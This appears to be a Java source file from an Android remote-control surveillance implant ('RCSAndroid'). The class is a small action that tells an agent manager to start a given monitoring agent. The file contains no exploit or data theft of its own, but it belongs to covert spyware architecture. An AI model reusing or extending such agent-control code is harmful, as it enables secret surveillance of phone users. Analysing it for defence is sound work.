/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : StartAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action;

import java.io.IOException;

import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.util.DataBuffer;

import android.util.Log;

/**
 * The Class StartAgentAction.
 */
public class StartAgentAction extends AgentAction {
	private static final String TAG = "StartAgentAction";
	
	/**
	 * Instantiates a new start agent action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public StartAgentAction(final SubActionType type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		Log.d("QZ", TAG + " (execute): " + agentId);
		final AgentManager agentManager = AgentManager.self();

		agentManager.start(agentId);
		return true;
	}

}
